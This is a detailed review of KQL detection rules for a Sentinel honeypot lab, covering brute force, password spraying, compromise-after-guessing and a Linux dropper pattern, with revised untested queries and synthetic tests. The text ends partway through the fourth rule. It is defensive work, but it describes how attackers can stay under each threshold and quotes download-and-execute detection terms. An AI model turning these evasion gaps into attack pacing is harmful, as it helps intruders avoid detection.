# KQL Analytics Rule Review: SocHomelab

Review date: 2026-11-03 (branch `kql-review`).
Scope: the five scheduled analytics rules in `queries/detections/`. The 14 hunting queries (`queries/01-*.kql` to `queries/14-*.kql`) were read only for schema context and for the coverage summary.

> **I had no access to a live Sentinel workspace. I did not execute any KQL in this document, original or revised, against data.** Every revised query is labeled **untested — validate in workspace before deploying**. Claims about operators, tables and Sentinel behavior cite Microsoft Learn. Everything else is my judgment and is labeled that way. See [Verification notes](#verification-notes).

---

## Executive summary

**Verdict.** These rules make a good lab foundation, and their thresholds match the README's numbers. They should not go into a real SOC as they are. Two rules have correctness bugs. The two rate rules leave a gap between them, even though the README says they "split the work with no overlap". Every scheduled rule watches only the Windows VM, so the SSH half of the lab (Cowrie and the real sshd) has no authentication detection at all.

**Top issues, ranked by severity**

1. **High: `bruteforce-then-success` can flood High-severity false positives, and it misses real compromise chains.** It never filters placeholder or loopback source addresses (`-`, empty, `127.0.0.1`) or logon types. If ten failures in one hour carry `IpAddress = "-"`, every successful logon in that hour that also carries `-` (service and system logons, for example) becomes a "compromise". The rule doesn't require the failures to come before the success. Its lookback equals its frequency (1h/1h), so guessing at 10:55 followed by a login at 11:02 is never correlated. It also can't see the split chain that the README itself documents, where one IP guesses and a different one logs in.
2. **High: `rdp-bruteforce` uses clock-aligned 5-minute bins inside a 5-minute lookback that isn't clock-aligned, so every run sees two partial bins.** Depending on when the rule was created, a source sending a steady 2–4 failures per minute (up to about 5,700 a day) never reaches 10 in either partial bin. `low-and-slow-bruteforce` excludes anything that averages 2 per minute or more, so that rate band gets past both rules. The README's "no overlap" claim fails in both directions: there is a gap, and a bursty source can trigger both rules.
3. **Medium: no scheduled detection covers SSH authentication.** No rule fires on Cowrie login brute force or spraying, on Cowrie accepting default credentials, or on real sshd logins. Real sshd logins aren't even collected (README, Limitations). Half the lab's attack surface is visible only to hunting queries.
4. **Medium: `password-spray` is narrow, and it may not fire on the attack that motivated it.** It aggregates per IP only, so distributed sprays are invisible. Its 10-minute bins are clock-aligned, so pacing at 19 usernames per 10 minutes gets past it. Its `< 3` average-guesses-per-name cap may also exclude the Hetzner source its header cites, which made about 7 guesses per name. Whether it does depends on that source's per-bin ratio, which needs checking against the Oct 3–5 data.
5. **Medium: `linux-dropper-pattern` matches only a single-line download-and-execute.** It misses the SFTP-upload-then-`nohup` delivery the README describes for Panchan. It relies on `has_any` with punctuation-heavy terms (`./`, `| sh`, `chmod +x`), and Microsoft Learn doesn't define how those terms match. It has no time filter and no schedule. Its header calls it a hunting query, while the README lists it as a High-severity detection.

**ATT&CK coverage (the 13 techniques in the README).** **2 of 13 are covered, 3 are partial, and 8 have no scheduled detection.** Seven of those 8 have a hunting query; T1496 has nothing at all. A hunting query is not a detection. Nobody gets alerted when a hunting query would have returned rows.

---

## Cross-cutting findings

These apply to several rules. The per-rule sections refer back to them.

1. **Placeholder and loopback source addresses.** Event 4625 records the Source Network Address as an IPv6 address or a `::ffff:`-mapped IPv4 address. `::1` and `127.0.0.1` mean localhost ([4625][ev4625]). In practice the field is also `-` or empty when there is no network source. Two rules filter `""` and `"-"`, two don't, and none filters loopback. The revised rules all use `IpAddress !in ("", "-", "127.0.0.1", "::1", MyIP)`. Check whether mapped addresses occur in your data with `SecurityEvent | where IpAddress startswith "::ffff:" | count`. If they do, normalize with `replace_string()` the way `10-endlessh-tarpit.kql` already does.
2. **Count usernames with `TargetUserName`, not `Account`.** The 4625 event XML puts the attempted username in `TargetUserName` ([4625][ev4625]). The SecurityEvent reference only describes `Account` as "the security context for services or users" ([SecurityEvent][tbl-se]). *My judgment:* for logon events `Account` is rendered as `TargetDomainName\TargetUserName`, and in a failed logon the domain half is supplied by the attacker. So `WORKGROUP\admin`, `\admin` and `.\admin` count as three accounts, and `Admin` and `admin` count as two. The revised rules use `tolower(TargetUserName)`.
3. **Time windows have to fit inside the lookback.** Sentinel allows a frequency and lookback of 5 minutes to 14 days, requires frequency ≤ lookback, and runs scheduled rules on a built-in five-minute delay. A new rule first runs immediately on creation, so where its run times fall relative to clock boundaries is arbitrary ([scheduled rules][sched]). Any rule that aggregates over an N-minute window needs lookback ≥ N + frequency. Otherwise a burst that straddles two runs is never seen whole. Three of the five rules set lookback equal to frequency.
4. **Measure ingestion delay before tuning lookback.** The documented pattern is to extend lookback by the delay and, if needed, deduplicate on `ingestion_time()` ([ingestion delay][ingest]).

    ```kql
    // Read-only diagnostic. Run once per table: SecurityEvent, Cowrie_CL, Syslog.
    SecurityEvent
    | where TimeGenerated > ago(1d)
    | extend DelaySec = (ingestion_time() - TimeGenerated) / 1s
    | summarize percentiles(DelaySec, 50, 95, 99)
    ```

    If `Cowrie_CL` shows a delay of about 0 s, its `TimeGenerated` is the ingestion time, not Cowrie's event time. AMA custom JSON collection uses ingestion time unless the DCR transformation sets `TimeGenerated` from the record ([AMA JSON logs][amajson]).
5. **Alert and incident hygiene is unspecified.** None of the rule headers sets event grouping, entity mapping, ATT&CK tags or alert grouping. With the defaults, a rule produces one alert per run that summarizes every row, and one incident per alert ([scheduled rules][sched]). Don't use suppression to fight noise. It stops the whole rule for up to 24 hours, which hides every *other* attacker too ([scheduled rules][sched]). Sentinel also drops an Account entity whose Name is a generic built-in such as ADMIN, ADMINISTRATOR or ROOT ([entities reference][entref]). Those are the most-guessed names in this lab, so put usernames in custom details as well.
6. **Nothing watches the data sources.** If `SecurityEvent` or `Cowrie_CL` stops arriving, every rule goes quiet without warning. `11-sensor-health.kql` is a hunting query. A scheduled version is drafted in [Recommended new detections](#recommended-new-detections-prioritized).
7. **Severity should differ between the honeypot and production.** In the honeypot nearly every source is hostile, so the brute-force rules have a false-positive rate near 0. Their alerts are also expected and need no action. Sentinel's severity scale reserves High for activity that "provides the threat actor with wide ranging access" ([scheduled rules][sched]). A failed guess or a command typed into a fake shell gives no access. Use Low or Informational for "attack observed" rules in the honeypot, and keep High for evidence of real access: Rule 4, and new rule P1 below.
8. **Plan for the platform changes.** Microsoft now recommends Defender XDR custom detections for new rules ([ingestion delay][ingest], banner), and Sentinel leaves the Azure portal after March 31, 2027 ([scheduled rules][sched]). The KQL in this document is portable, but plan the move.

---

## Rule 1: RDP brute force (`rdp-bruteforce.kql`)

### What it detects

The rule flags any source IP with 10 or more failed logons (Event 4625) in one clock-aligned 5-minute bin. It counts every 4625 logon type, so it is really a network-logon brute-force rule. RDP with NLA authenticates as a network logon (type 3), the same type that SMB uses. The host firewall is off, so if the NSG exposes more than 3389, SMB and WinRM guessing land here too. This is my judgment, based on the logon-type tables in [4625][ev4625] and [logon types][logontypes].

**ATT&CK:** T1110 Brute Force, sub-technique **T1110.001 Password Guessing** (Credential Access). When one source tries many usernames, it also overlaps T1110.003.

### False positives and blind spots

**Honeypot context.** Every source except the analyst's is hostile, so true false positives are about 0. The problem is volume. The Korea Telecom source (448,700 attempts in one hour) produces an alert every 5 minutes for about 3 hours, roughly 36 alerts and, by default, 36 incidents.

**Production false positives:** NAT or shared egress (many users behind one IP), RD Gateway and VDI brokers, services, scheduled tasks and mapped drives with stale credentials, credentialed vulnerability scans (scanners use network logons, per [logon types][logontypes]), and misconfigured apps that retry.

**Low-and-slow evasion and blind spots**

- **Pacing.** A source that stays at 9 failures or fewer per 5 minutes (1.8 per minute, about 2,600 a day) never fires. `low-and-slow` picks it up only if it shows at least 20 failures across at least 3 clock hours.
- **Window boundaries (bug).** Bins are multiples of 5 minutes from the clock ([bin()][bin]). The scheduled window `[run-5m, run]` almost never lines up with them, so each run sees two partial bins. For example, 6 failures at 12:04 and 6 at 12:05 land in two bins of 6 and never fire, even though 12 happened inside 2 minutes.
- **Phase band (bug).** If the rule's run times sit φ minutes past a 5-minute boundary, a steady source is caught only when its rate × max(φ, 5−φ) ≥ 10. At the worst phase (φ = 2.5), that means 4 per minute or more. `low-and-slow` drops sources that average 2 per minute or more. So depending on rule phase, a steady 2–4 per minute source is invisible to both rules.
- **IP rotation.** A botnet that keeps each IP below 10 per 5 minutes is never detected, because the rule has no view by target (failures per host or per username across sources). The observed Google Cloud trio (about 6 per minute each) would still fire individually. A larger fleet at 1 per minute each would not.
- **Spreading across hosts doesn't help an attacker.** The original groups by `IpAddress` only, not by `Computer`, so attempts against several hosts still add up. This is a strength worth keeping.
- **Data-source gaps.**
  - 4625 is logged only when Audit Logon failure auditing is on ([4625][ev4625]). It is in the AMA Minimal and Common event sets, but a Custom XPath set could drop it ([event sets][evsets]).
  - Rows with `IpAddress = "-"` all land in one pseudo-source, which can alert and then map junk to the IP entity (bug).
  - *Judgment, not in Learn:* with NLA, some failures are logged without a source address. The IP then appears only in the `RemoteDesktopServices-RdpCoreTS/Operational` log, which this connector doesn't collect, because it only collects the Security and AppLocker channels ([event sets][evsets]). To check, run `SecurityEvent | where EventID == 4625 | summarize count() by HasIp = IpAddress !in ("", "-")`.
  - Connections that fail before authentication (TLS or CredSSP negotiation errors, banner grabs) produce no 4625 at all.

### Tuning

What changes, and why:

1. **Replace fixed bins with a sliding window.** Build per-IP 1-minute counts with `make-series` ([make-series][mkseries]). Apply a trailing 5-point sum with `series_fir(..., dynamic([1,1,1,1,1]), false, false)`. `normalize` must be `false` to get a sum: it defaults to `true` for non-negative filters, which gives an average. `center=false` gives a trailing window ([series_fir][fir]). Then take the maximum ([series_stats_dynamic][sstats]). Any minute-aligned 5-minute window with 10 or more failures now fires, whatever the rule's phase. The remaining quantization error is at most one minute of events, instead of up to five.
2. **Set lookback to 10 minutes with a 5-minute frequency** (lookback ≥ window + frequency). Every 5-minute window then falls entirely inside at least one run. A window can show up in two runs, and alert grouping absorbs that. Raise the lookback to 15 minutes if measured latency exceeds the built-in 5-minute delay (cross-cutting finding 4).
3. **Exclude placeholder, loopback and analyst IPs** (cross-cutting finding 1).
4. **Normalize usernames, and split failures by SubStatus.** `0xC0000064` means the username doesn't exist. `0xC000006A` means a real account with a wrong password, which is the dangerous case ([4625][ev4625]).
5. **Return one row per IP instead of one per (IP, bin),** so an attacker produces at most one alert per run.
6. **Wrap the reused base set in `materialize()`.** Microsoft recommends this for a `let` that is referenced more than once ([best practices][bp]).

**Revised KQL (untested — validate in workspace before deploying)**

```kql
// Fast brute force v2 -- untested — validate in workspace before deploying
// Sentinel: run every 5m, look back 10m (raise to 15m if measured latency > 5m). Severity: Medium (honeypot: Low).
let Lookback  = 10m;     // = 5m window + 5m frequency
let Threshold = 10;      // failures in any sliding (minute-aligned) 5-minute window
let MyIP      = "<your-home-ip>";
let Failures = materialize(
    SecurityEvent
    | where TimeGenerated > ago(Lookback)
    | where EventID == 4625
    | where IpAddress !in ("", "-", "127.0.0.1", "::1", MyIP)
    | project TimeGenerated, IpAddress, Computer, User = tolower(TargetUserName), LogonType, SubStatus);
let Bursts = Failures
    | make-series PerMinute = count() default = 0
        on TimeGenerated from bin(ago(Lookback), 1m) to bin(now(), 1m) + 1m step 1m
        by IpAddress
    // trailing 5-point SUM (normalize=false, center=false) = failures in the 5 minutes ending at each minute
    | extend Peak5m = todouble(series_stats_dynamic(
                 series_fir(PerMinute, dynamic([1, 1, 1, 1, 1]), false, false))["max"])
    | where Peak5m >= Threshold
    | project IpAddress, Peak5m;
Bursts
| join kind=inner (
    Failures
    | summarize Attempts             = count(),
                Accounts             = dcount(User),
                SampleAccounts       = make_set(User, 20),
                NonexistentUserFails = countif(SubStatus =~ "0xc0000064"),
                ExistingAccountFails = countif(SubStatus =~ "0xc000006a"),
                LogonTypes           = make_set(LogonType, 5),
                Hosts                = make_set(Computer, 5),
                FirstSeen            = min(TimeGenerated),
                LastSeen             = max(TimeGenerated)
              by IpAddress
  ) on IpAddress
| project IpAddress, Peak5m, Attempts, Accounts, SampleAccounts, NonexistentUserFails,
          ExistingAccountFails, LogonTypes, HostName = tostring(Hosts[0]), FirstSeen, LastSeen
```

**Recommended Sentinel settings**

| Setting | Value |
| --- | --- |
| Run query every / Lookup data from the last | 5 min / 10 min (15 min if latency > 5 min) |
| Alert threshold | Number of results > 0 |
| Event grouping | Trigger an alert for each event (one per IP; Sentinel caps a run at 150 alerts ([scheduled rules][sched])) |
| Entity mapping | IP: Address = `IpAddress`; Host: HostName = `HostName` |
| Custom details | `Peak5m`, `Attempts`, `Accounts`, `ExistingAccountFails`, `SampleAccounts` |
| Alert grouping | Enabled; group if selected entities match (IP); time frame 24 h in the honeypot (the default is 5 h; allowed range is 5 min–7 days) |
| Suppression | Off (it is rule-wide) |
| ATT&CK | Credential Access: T1110.001 |
| Severity | Medium in production; Low in the honeypot |

### Syntax and operator check

- **OK:** the columns `SecurityEvent.EventID` (int), `IpAddress`, `Account`, `TargetUserName`, `LogonType` (int), `SubStatus` (string) and `Computer` exist ([SecurityEvent][tbl-se]).
- **OK:** `summarize ... by bin(TimeGenerated, 5m)` is valid; summarize needs explicit bins ([summarize][summ]). **Issue:** bin rounds down to multiples of the bin size ([bin()][bin]), so the bins are clock-aligned and the scheduled window is not. That causes the boundary bug above.
- **OK:** `dcount()` is a HyperLogLog estimate but is exact for small sets (up to 1,000 values at the default accuracy) ([dcount][dcount]), so it's fine here.
- **Performance:** there's no in-query time filter. That's fine in a scheduled rule, where the lookback limits the data. Run ad hoc, the query scans all retention. Microsoft recommends filtering on datetime columns first ([best practices][bp]).
- **Deprecated or legacy patterns:** none found.

### Validation test (untested — validate in workspace before deploying)

These synthetic queries need no workspace data. The first two reproduce the boundary bug. The third shows the fix.

```kql
// (a) ORIGINAL logic, burst straddling the 12:05 bin edge. Expected: 0 rows (6 + 6), although 12 failures fell within 2 minutes.
let T0 = datetime(2026-10-04 12:00:00);
range i from 0 to 11 step 1
| extend TimeGenerated = T0 + 4m + i * 10s, IpAddress = "203.0.113.10"
| summarize Attempts = count() by IpAddress, bin(TimeGenerated, 5m)
| where Attempts >= 10
```

```kql
// (b) ORIGINAL logic, steady 3/min source, run window offset 2.5 min from the bins.
// Expected: 0 rows (partial bins of 7 and 8), although 15 failures fell inside the 5-minute window.
let T0 = datetime(2026-10-04 12:00:00);
range i from 0 to 59 step 1
| extend TimeGenerated = T0 + i * 20s, IpAddress = "203.0.113.20"
| where TimeGenerated between ((T0 + 150s) .. (T0 + 450s))
| summarize Attempts = count() by IpAddress, bin(TimeGenerated, 5m)
| where Attempts >= 10
```

```kql
// (c) REVISED logic on the data from (a). Expected: 1 row, Peak5m = 12.
let T0 = datetime(2026-10-04 12:00:00);
range i from 0 to 11 step 1
| extend TimeGenerated = T0 + 4m + i * 10s, IpAddress = "203.0.113.10"
| make-series PerMinute = count() default = 0 on TimeGenerated from T0 to T0 + 10m step 1m by IpAddress
| extend Peak5m = todouble(series_stats_dynamic(series_fir(PerMinute, dynamic([1, 1, 1, 1, 1]), false, false))["max"])
| where Peak5m >= 10
```

Negative case: 9 failures spread over 5 minutes should return 0 rows from (c).

---

## Rule 2: Low-and-slow brute force (`low-and-slow-bruteforce.kql`)

### What it detects

Within a 24-hour lookback, the rule flags source IPs with at least 20 failures that appear in at least 3 distinct clock hours and average under 2 failures per minute between their first and last failure. It is meant to complement Rule 1.

**ATT&CK:** **T1110.001 Password Guessing**, slow-paced. When `Accounts` is high it is slow spraying, which is T1110.003.

### False positives and blind spots

**Honeypot context.** Every source is hostile. Slow sources are usually botnet members on a schedule. The real problem is **duplicate alerts**: the rule runs every hour over 24 hours and has no "new since last run" logic, so one slow source re-alerts every hour until it ages out. That can mean about 24 alerts, and about 24 incidents with default settings.

**Production false positives:** a device with a cached stale password that retries all day (a phone, a mapped drive, a service), a monitoring probe with bad credentials, or NAT egress.

**Evasion and blind spots**

- **Volume floor.** Under 20 failures per IP per 24 hours never fires. Rotate across a 1,000-IP botnet and that's 19,000 guesses a day with no alert.
- **The "3+ separate hours" requirement is shallow.** `dcount(bin(TimeGenerated, 1h))` counts clock-hour buckets, so a source active from 10:59 to 12:00 (61 minutes) touches 3 buckets and qualifies. Conversely, confining activity to 2 clock hours per rolling 24 hours (for example 10:00–11:59 at 1.9 per minute, about 228 attempts, then waiting more than 24 hours) never qualifies.
- **The rate is an average, not a ceiling.** `PerMinute` is attempts divided by the first-to-last span:
  - **Overlap (contradicts README line 128):** 300 failures in 2 minutes at 08:00, then one at 09:30 and one at 11:00, gives 3 clock hours and 302/180 ≈ 1.68 per minute. This rule fires, and Rule 1 fires on the 08:00 burst too.
  - **Gap:** a steady 3 per minute for 10 hours (1,800 failures) is excluded here because 3 ≥ 2, and Rule 1 can miss it depending on phase (Rule 1, phase band).
- **Multi-day pacing.** One attempt every 75 minutes is about 19 a day, so it never fires.
- **Data-source gaps:** the same as Rule 1 (placeholder IPs, NLA, audit policy, event set).

### Tuning

1. **Make it the exact complement of Rule 1.** Compute the same sliding 5-minute peak over 24 hours, and require `Peak5m < 10` (Rule 1's threshold). If a source ever tripped the fast rule, it can't appear here. If it never did and it persisted, it does. That removes both the gap and the overlap, apart from 1-minute quantization.
2. **Keep the existing volume and persistence thresholds** (≥ 20 attempts, ≥ 3 clock hours), and add a span of at least 2 hours so that "3+ separate hours" means real persistence.
3. **Require the source to still be active.** `LastSeen > ago(Frequency + 10m)` stops the ~23 repeat alerts after a source goes quiet. A source almost always newly qualifies when a new failure arrives, so this rarely creates misses. The exception is a source whose old burst ages out of the 24-hour window while it is quiet. The extra 10 minutes covers the built-in 5-minute delay. *Judgment:* Learn doesn't say how that delay interacts with an in-query `ago()`, so I kept a margin.
4. **Apply the same IP filter and username normalization as Rule 1,** and use `materialize()`.

**Revised KQL (untested — validate in workspace before deploying)**

```kql
// Low-and-slow brute force v3 -- untested — validate in workspace before deploying
// Sentinel: run every 1h, look back 24h. Severity: Medium (honeypot: Low).
let Lookback      = 24h;
let Frequency     = 1h;
let FastThreshold = 10;      // keep equal to Rule 1's Threshold
let MinAttempts   = 20;
let MinClockHours = 3;
let MinSpan       = 2h;      // makes "3+ separate hours" mean real persistence
let MyIP          = "<your-home-ip>";
let Failures = materialize(
    SecurityEvent
    | where TimeGenerated > ago(Lookback)
    | where EventID == 4625
    | where IpAddress !in ("", "-", "127.0.0.1", "::1", MyIP)
    | project TimeGenerated, IpAddress, Computer, User = tolower(TargetUserName), SubStatus);
let Persistent = materialize(
    Failures
    | summarize Attempts             = count(),
                Accounts             = dcount(User),
                SampleAccounts       = make_set(User, 20),
                ExistingAccountFails = countif(SubStatus =~ "0xc000006a"),
                Hosts                = make_set(Computer, 5),
                ClockHours           = dcount(bin(TimeGenerated, 1h)),
                FirstSeen            = min(TimeGenerated),
                LastSeen             = max(TimeGenerated)
              by IpAddress
    | where Attempts >= MinAttempts
        and ClockHours >= MinClockHours
        and LastSeen - FirstSeen >= MinSpan
        and LastSeen > ago(Frequency + 10m));   // still active: no repeat alerts after the source goes quiet
let PersistentIPs = Persistent | project IpAddress;
let Peaks = Failures
    | where IpAddress in (PersistentIPs)
    | make-series PerMinute = count() default = 0
        on TimeGenerated from bin(ago(Lookback), 1m) to bin(now(), 1m) + 1m step 1m
        by IpAddress
    | extend Peak5m = todouble(series_stats_dynamic(
                 series_fir(PerMinute, dynamic([1, 1, 1, 1, 1]), false, false))["max"])
    | project IpAddress, Peak5m;
Persistent
| join kind=inner (Peaks) on IpAddress
| where Peak5m < FastThreshold            // never reached the fast rule's threshold: no gap, no overlap
| extend HoursSpan    = round((LastSeen - FirstSeen) / 1h, 1),
         PerMinuteAvg = round(Attempts / max_of((LastSeen - FirstSeen) / 1m, 1.0), 2),
         HostName     = tostring(Hosts[0])
| project IpAddress, Attempts, Accounts, SampleAccounts, ExistingAccountFails, ClockHours,
          HoursSpan, PerMinuteAvg, Peak5m, FirstSeen, LastSeen, HostName
```

Optional: for sources slower than about 20 a day, run a copy with `Lookback = 7d`, a 1-day frequency, `MinAttempts = 30` and `MinClockHours = 10`.

**Recommended Sentinel settings**

| Setting | Value |
| --- | --- |
| Run query every / Lookup data from the last | 1 h / 24 h |
| Alert threshold | Number of results > 0 |
| Event grouping | Trigger an alert for each event |
| Entity mapping | IP: Address = `IpAddress`; Host: HostName = `HostName` |
| Custom details | `Attempts`, `ClockHours`, `HoursSpan`, `PerMinuteAvg`, `Peak5m`, `SampleAccounts` |
| Alert grouping | Enabled; group by IP; time frame 24 h |
| ATT&CK | Credential Access: T1110.001 (add T1110.003 when `Accounts` ≥ 20) |
| Severity | Medium in production; Low in the honeypot |

### Syntax and operator check

- **OK:** `ago(24h)` ([ago()][ago]). All uses of `ago()` and `now()` in a statement share the same reference time ([now()][now]).
- **OK:** `!in` is case-sensitive, which is fine for `""` and `"-"` ([!in][notin]).
- **OK:** `(LastSeen - FirstSeen) / 1h` divides a timespan by a timespan and returns a `real` ([timespan][ts]; [datetime arithmetic][dtarith]). `max_of(real, 1.0)` meets its same-type rule ([max_of()][maxof]). `Attempts / real` returns a real, so there's no integer truncation here ([numerical operators][numops]).
- **Unverified:** `dcount(bin(TimeGenerated, 1h))`, a dcount over a datetime expression. Learn's parameter table lists `expr` as `string` ([dcount][dcount]). The same style of table on `make_set` also says `string`, yet that page's own example aggregates an `int` column ([make_set][mkset]). So I treat datetime input as valid but not documented.
- **OK:** a 24-hour lookback with a 1-hour frequency meets frequency ≤ lookback ([scheduled rules][sched]).
- **Note:** the trailing `order by HoursActive desc` costs little, but it has no effect on alerting (judgment).
- **Not verified:** the header comment "Validated Oct 4, 2026: flagged 6 sources…". I had no data to re-check it.

### Validation test (untested — validate in workspace before deploying)

Build synthetic `datatable`/`range` inputs for each case, and run the v2 and v3 logic with `ago()` replaced by fixed `datetime()` bounds.

| Case | Synthetic input | v2 (current) expected | v3 (revised) expected |
| --- | --- | --- | --- |
| A: the source v1 missed | 38 failures, one every 12 min over 7.5 h | alert | alert |
| B: bursty | 300 in 2 min at 08:00, then 1 at 09:30 and 1 at 11:00 | alert (avg 1.68/min); overlaps Rule 1 | no alert (Peak5m ≥ 10, so Rule 1 owns it) |
| C: steady 3/min for 4 h | 720 failures | no alert (avg 3/min); Rule 1 may also miss it, a gap | no alert here; Rule 1 v2 alerts (Peak5m = 15) |
| D: 61-minute source | 25 failures from 10:59 to 12:00 | alert (3 clock hours) | no alert (span < 2 h) |

---

## Rule 3: Password spraying (`password-spray.kql`)

### What it detects

For each source IP and clock-aligned 10-minute bin, the rule flags 20 or more distinct `Account` values with an average of fewer than 3 attempts per account. It then rolls the matching bins up per IP. Its header says it runs every hour with a 1-hour lookback.

**ATT&CK:** **T1110.003 Password Spraying** (Credential Access). The header's mapping is correct.

### False positives and blind spots

**Honeypot context.** Every source is hostile. 99.998% of failed RDP logons were for usernames that don't exist (README), so in this lab the rule mostly detects blind username guessing. Real spraying against existing accounts would show up as SubStatus `0xC000006A` ([4625][ev4625]), and the rule doesn't distinguish the two.

**Production false positives:** a shared NAT egress where many users fail once each (a password-expiry morning, an SSO outage), RD Gateway, Citrix, Exchange, ADFS or VPN servers that relay authentication (the "source" is the relay), and bulk onboarding scripts.

**Evasion and blind spots**

- **Pacing.** 19 usernames per 10 minutes (about 2,700 a day) never fires. Rule 2 catches it only if the source also persists for 3 or more clock hours and stays under 2 per minute.
- **Bin edges (same bug class as Rule 1).** 10 names at 12:08–12:09 and 10 more at 12:10–12:11 make two bins of 10, so nothing fires. Because the 1-hour run window isn't clock-aligned either, the first and last bins of each run are partial.
- **The ratio cap.** Making 3 or more guesses per name excludes a source. Usually Rule 1 catches it instead: 20 names × 3 guesses in 10 minutes is 30 per 5 minutes.
- **The rule's own example may not match it.** The header cites 144.76.103.122: 5,054 usernames at about 7 guesses each, roughly 35,000 attempts. If that bot cycled name by name (7 passwords, then the next name), the per-bin ratio is about 7 and this rule never fired. Rule 1 would have caught it as plain brute force. If it cycled password by password across the whole list, the ratio is about 1 and the rule fires. Run the inner `summarize` for that IP over Oct 3–5 to find out.
- **Distributed spraying.** Many IPs, each trying a few names, is invisible to a rule that aggregates per IP. Real-world spraying is often distributed.
- **Inconsistent definitions within the repo.** `13-attack-strategies.kql` labels "Spray" as 100 or more usernames with no ratio. This detection uses 20 or more with a ratio under 3.
- **Username inflation.** `dcount(Account)` counts domain\user strings and is case-sensitive (cross-cutting finding 2).

### Tuning

1. **Drop the 10-minute bins and aggregate per IP over a 1-hour window, running every 15 minutes.** Bin-edge splits go away. Pacing at 19 per 10 minutes no longer works, because that is 114 per hour. Detection latency is at most about 20 minutes. KQL can't sum distinct counts across sliding buckets, so a wider unbinned window is the practical fix.
2. **Compute a real-valued ratio with a configurable cap.** Today's `Attempts / Accounts` is `long / long`, which truncates ([numerical operators][numops]). For positive integers, floor(x) < 3 holds exactly when x < 3, so the current result happens to be correct. Change the threshold to 2.5 and it silently breaks.
3. **Count real accounts separately** (`0xC000006A`), and raise severity dynamically when any are hit. Sentinel can set alert severity from a query column ([scheduled rules][sched], "Customize alert details").
4. **Normalize usernames, exclude placeholder IPs, and add an explicit time filter.**
5. **Optional companion for production:** a target-centric query for distributed sprays (below). It would be noisy on an internet-exposed honeypot.

**Revised KQL (untested — validate in workspace before deploying)**

```kql
// Password spraying v2 -- untested — validate in workspace before deploying
// Sentinel: run every 15m, look back 1h. Severity: from AlertSeverity column (Medium / High).
let Lookback             = 1h;
let MinAccounts          = 20;
let MaxGuessesPerAccount = 3.0;   // validate against 144.76.103.122 (Oct 3-5) before keeping this value
let MyIP                 = "<your-home-ip>";
SecurityEvent
| where TimeGenerated > ago(Lookback)
| where EventID == 4625
| where IpAddress !in ("", "-", "127.0.0.1", "::1", MyIP)
| extend User = tolower(TargetUserName)
| summarize Attempts         = count(),
            Accounts         = dcount(User),
            ExistingAccounts = dcountif(User, SubStatus =~ "0xc000006a"),
            SampleAccounts   = make_set(User, 25),
            Hosts            = make_set(Computer, 5),
            FirstSeen        = min(TimeGenerated),
            LastSeen         = max(TimeGenerated)
          by IpAddress
| where Accounts >= MinAccounts
| extend GuessesPerAccount = round(todouble(Attempts) / Accounts, 2)
| where GuessesPerAccount < MaxGuessesPerAccount
| extend AlertSeverity = iff(ExistingAccounts > 0, "High", "Medium"),
         HostName      = tostring(Hosts[0])
```

```kql
// OPTIONAL distributed spray against one host -- untested — validate in workspace before deploying
// Production-oriented; on an internet-exposed honeypot this will fire constantly.
let Lookback = 1h;
SecurityEvent
| where TimeGenerated > ago(Lookback)
| where EventID == 4625
| where IpAddress !in ("", "-", "127.0.0.1", "::1")
| extend User = tolower(TargetUserName)
| summarize Attempts         = count(),
            Accounts         = dcount(User),
            Sources          = dcount(IpAddress),
            ExistingAccounts = dcountif(User, SubStatus =~ "0xc000006a"),
            SampleSources    = make_set(IpAddress, 25)
          by Computer
| where Sources >= 10 and Accounts >= 20
| extend AttemptsPerSource = round(todouble(Attempts) / Sources, 1)
| where AttemptsPerSource < 10
```

**Recommended Sentinel settings**

| Setting | Value |
| --- | --- |
| Run query every / Lookup data from the last | 15 min / 1 h |
| Alert threshold | Number of results > 0 |
| Event grouping | Trigger an alert for each event |
| Entity mapping | IP: Address = `IpAddress`; Host: HostName = `HostName` |
| Alert details | Severity from `AlertSeverity` |
| Custom details | `Accounts`, `GuessesPerAccount`, `ExistingAccounts`, `SampleAccounts` |
| Alert grouping | Enabled; group by IP; time frame 24 h |
| ATT&CK | Credential Access: T1110.003 |

### Syntax and operator check

- **Fragile, currently correct:** `Attempts / Accounts < 3` is integer division ([numerical operators][numops]); see tuning item 2.
- **OK:** `dcount()` is exact at these cardinalities ([dcount][dcount]). The two-stage summarize is valid ([summarize][summ]).
- **Issue:** with no in-query time filter and a header that says 1h/1h, bins at the edges of the lookback are partial ([bin()][bin]; [scheduled rules][sched]).
- **OK:** `dcountif` and `make_set` are documented aggregations ([make-series aggregation list][mkseries]; [make_set][mkset]).
- **Deprecated or legacy patterns:** none.

### Validation test (untested — validate in workspace before deploying)

| Case | Synthetic input | v1 expected | v2 expected |
| --- | --- | --- | --- |
| Bin-edge spray | 10 names (1 guess each) at 12:08–12:09 and 10 more at 12:10–12:11, one IP | no alert | alert (20 accounts, ratio 1.0) |
| Paced spray | 19 names per 10 min for 1 h | no alert | alert (114 accounts) |
| Brute force, not a spray | 3 names × 50 guesses | no alert | no alert (Rule 1 owns it) |
| Real accounts hit | 20 names, 2 of them with `SubStatus = 0xc000006a` | alert (Medium) | alert, `AlertSeverity = High` |

---

## Rule 4: Brute force then success (`bruteforce-then-success.kql`)

### What it detects

The rule flags any successful logon (4624) in the last hour from an IP that also has 10 or more failed logons (4625) in that same hour. The intent is to catch a compromise that follows password guessing.

**ATT&CK:** T1110 (.001/.003) as the precondition, followed by **T1078 Valid Accounts**. On this workgroup VM that is T1078.003 Local Accounts, or **T1078.001 Default Accounts** for Guest, DefaultAccount or the built-in Administrator. Entry is through **T1133 External Remote Services** (internet-exposed RDP). This mapping is my judgment, from MITRE ATT&CK.

### False positives and blind spots

**Placeholder-IP join (bug, High).** `suspects` keeps whatever `IpAddress` the failures had, including `-` and empty. The success side has no IP or `LogonType` filter. Ten or more failures with no network source in an hour, such as a service with a stale password, make every 4624 in that hour that also has `-` match. The 4625 documentation shows local logons carrying loopback addresses ([4625][ev4625]). *Judgment:* service and system 4624s commonly carry `-`. The result is High-severity alerts on SYSTEM logons.

**Other false positives**

- **Wrong order:** a success at 10:05 followed by 10 failures at 10:40 from the same IP still fires.
- **Production NAT:** user A fails 10 times while user B logs in from the same egress IP, or a stale device and its owner share one IP.
- **Honeypot context:** any *real* success from a non-analyst IP is a true positive by definition. *Judgment:* with the host firewall off, SMB null sessions show up as 4624 `ANONYMOUS LOGON` type 3. A scanner that also guessed would match, even though it gained nothing.

**Blind spots**

- **Chains that cross a run boundary.** With lookback equal to frequency, failures at 10:50–10:59 and a success at 11:01 fall into different runs and are never correlated.
